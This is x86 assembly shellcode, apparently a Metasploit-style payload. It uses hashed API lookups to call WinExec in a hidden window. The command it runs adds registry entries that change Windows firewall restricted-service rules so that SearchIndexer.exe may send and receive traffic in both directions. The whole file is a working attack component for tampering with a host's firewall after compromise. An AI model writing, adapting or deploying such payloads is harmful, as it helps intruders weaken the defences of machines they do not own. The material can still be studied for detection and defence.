[BITS 32]
[ORG 0]

  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
delta:                   ;
%include "block_api.asm" ; 
start:                   ;
  pop ebp                ; Pop off the address of 'api_call' for calling later.
  push byte 0            ; uCmdShow = 0 - Don't show a CMD window
  lea eax, [ebp+command-delta]
  push eax               ;
  push 0x876F8B31        ; hash( "kernel32.dll", "WinExec" )
  call ebp               ; WinExec( &command, 0 );
  push 0x000007D0        ; = 2000 ms
  push 0xE035F044        ; hash( "kernel32.dll", "Sleep" )
  call ebp               ; Sleep( 2000 );
  jmp continue
command:
  db 'cmd /c "reg add HKLM\SYSTEM\CurrentControlSet\services\SharedAccess\Parameters\FirewallPolicy\RestrictedServices\Configurable\System /v SearchIndexer-1 /t REG_SZ /d "v2.0|Action=Allow|Active=TRUE|Dir=In|App=%systemDrive%\WINDOWS\system32\SearchIndexer.exe|Svc=WSearch|Name=SearchIndexer-1|" & reg add HKLM\SYSTEM\CurrentControlSet\services\SharedAccess\Parameters\FirewallPolicy\RestrictedServices\Configurable\System /v SearchIndexer-2 /t REG_SZ /d "v2.0|Action=Allow|Active=TRUE|Dir=Out|App=%systemDrive%\WINDOWS\system32\SearchIndexer.exe|Svc=WSearch|Name=SearchIndexer-2|""', 0
continue:
  ; Woohoo